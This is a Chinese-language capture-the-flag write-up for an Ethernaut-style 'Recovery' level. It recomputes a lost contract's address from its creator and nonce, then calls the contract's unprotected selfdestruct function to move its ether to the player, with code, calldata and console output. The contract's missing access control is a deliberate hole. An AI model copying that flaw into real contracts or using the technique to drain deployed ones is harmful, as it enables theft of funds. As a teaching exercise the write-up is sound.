# 18 Recovery

## 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

目标: 

使用`new SimpleToken(_name, msg.sender, _initialSupply);`创建的合约的地址丢了, 要求找回来, 并拿回合约上的ether

### 合约地址是如何被计算的

部署合约时(无论是在合约中通过`new`关键字部署还是通过web3.js等使用外部账户部署), 合约的地址的生成都不是随机的, 而是计算出来的, 参考这里: https://swende.se/blog/Ethereum_quirks_and_vulns.html

### 地址恢复

可以通过上面文章中的算法进行恢复, 也可以直接调用`ethers.js`中的工具函数:

https://docs.ethers.org/v5/api/utils/address/#utils--contract-addresses

### 关于`nonce`

`nonce` 是一个整型值，它用于标识一个以太坊地址发出的交易的唯一性。

在以太坊网络中，每一个地址都关联了一个 nonce 值，用来跟踪该地址发出的交易数量。当一个地址发出一笔交易时，它的 nonce 值会增加 1。这样，每笔交易的 nonce 值都是唯一的，可以用来防止重放攻击.

`nonce`的初始值为了, 地址发起一笔交易就增加1

在我们的挑战中, `Recovery`合约被创建后,发起的第一笔交易就是使用`new`创建`SimpleToken`, 所以我们这里要用到的`nonce`为1



## 找回合约地址

```
mkdir findaddr && cd findaddr
npm init
npm i ethers
touch index.js
```

index.js:

```js
const ethers = require("ethers");

//addr is contract(Recovery) instance address
const addr = "0xC2a4C31E9e5d4219C874B2ADef56aCBd302AE687";
const nonce = "0x01";

//
// // const rlpEncoded = ethers.utils.RLP.encode([addr, nonce]);
// // const contractAddress = ethers.utils.keccak256(rlpEncoded);
// // console.log(`0x${contractAddress.slice(26)}`);

const contractAddress = ethers.utils.getContractAddress({ from: addr, nonce: nonce });
console.log("lost contract address: ", contractAddress);

```

输出

```
lost contract address:  0x48D5D7b8C1351B7f6bb1ffA62696055DEEB9efb3
```



## 找回ether

直接调用找回的合约的`destory` 函数, 受益人传入player

生成calldata

```js
const iface = new ethers.utils.Interface(["function destroy(address payable _to) public",]);
//please replace _to as your player's address
const _to = "0x8e4a8993AD1111b88C39176D727c8F0598128be6";
const calldata = iface.encodeFunctionData("destroy", [_to]);
console.log("calldata: ", calldata);
```

输出:

```
calldata:  0x00f55d9d0000000000000000000000008e4a8993ad1111b88c39176d727c8f0598128be6
```



然后再到浏览器的console中利用calldata发送交易

```js
await web3.eth.sendTransaction({
	to: "0x48D5D7b8C1351B7f6bb1ffA62696055DEEB9efb3",
	data: "0x00f55d9d0000000000000000000000008e4a8993ad1111b88c39176d727c8f0598128be6",
	from: player
});
```



## 参考过程

```
^^.js:45 (‾⌣‾) Requesting new instance from level... <  < <<PLEASE WAIT>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 11:56:18.663
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x09da6486364d7683fdbec7df0fb78722bdcfa4461f2a68869d13ca070a2c7abb
^^.js:35 => Instance address0xA131280d65E9b103A6E0c5CB20Fb62a57C2Fa8C5
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 11:56:26.113
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x09da6486364d7683fdbec7df0fb78722bdcfa4461f2a68869d13ca070a2c7abb
redux-logger.js:1  action SET_BLOCK_NUM @ 11:56:34.397
instance
"0xA131280d65E9b103A6E0c5CB20Fb62a57C2Fa8C5"
await web3.eth.sendTransaction({
	to: "0xBd20c1bD3E12E50523A9406D9B8238b2566a8334",
	data: "0x00f55d9d0000000000000000000000008e4a8993ad1111b88c39176d727c8f0598128be6",
	from: player
});
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x59514b3c348e2ae502d6eccb308dcc014f6f514833d80c63e41bc183ad411a49
{transactionHash: "0x59514b3c348e2ae502d6eccb308dcc014f6f514833d80c63e41bc183ad411a49", transactionIndex: 0, blockNumber: 101, blockHash: "0x02e7f94e3bf6c22dedc99c83ea25e05d78bafae7d68a139d9582ecb310b13e95", from: "0x8e4a8993ad1111b88c39176d727c8f0598128be6", …}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x59514b3c348e2ae502d6eccb308dcc014f6f514833d80c63e41bc183ad411a49
^^.js:45 |[●▪▪●]| Submitting level instance... <  < <<PLEASE WAIT>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 11:57:20.723
redux-logger.js:1  action SET_BLOCK_NUM @ 11:57:24.462
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x2bb6ced63f24cdba7f9861d1b780484ff5a65af5273520e87be032b3b73f6121
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x2bb6ced63f24cdba7f9861d1b780484ff5a65af5273520e87be032b3b73f6121
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:73 ／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 11:57:34.393

```

